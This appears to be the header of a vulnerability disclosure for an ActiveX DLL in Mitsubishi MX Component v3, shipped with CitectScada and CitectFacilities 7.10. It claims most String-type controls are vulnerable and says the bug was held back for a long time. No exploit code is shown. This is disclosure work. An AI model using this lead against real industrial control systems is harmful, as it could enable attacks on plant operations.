Title: Mitsubishi MX Component v3 ActiveX 365+-Day [ActUWzd.dll (WzTitle)]
By:	Dr_IDE
File:	C:\MELSEC\Act\Control\ActUWzd.dll (Version 1.0.0.1)
Known Affected Systems: CitectScada 7.10r1 ships with this in the "Extras" folder.
Known Affected Systems: CitectFacilities 7.10 ships with this in the "Extras" folder.
I am unsure as to what other vendors ship/support this.
Pretty much any control in this library with type "String" is vulnerable.
Been sitting on this one forever. I don't even think Citect ships with this particular 3rd Party Component Anymore.
I would love to hear if any other packages ship with this component.
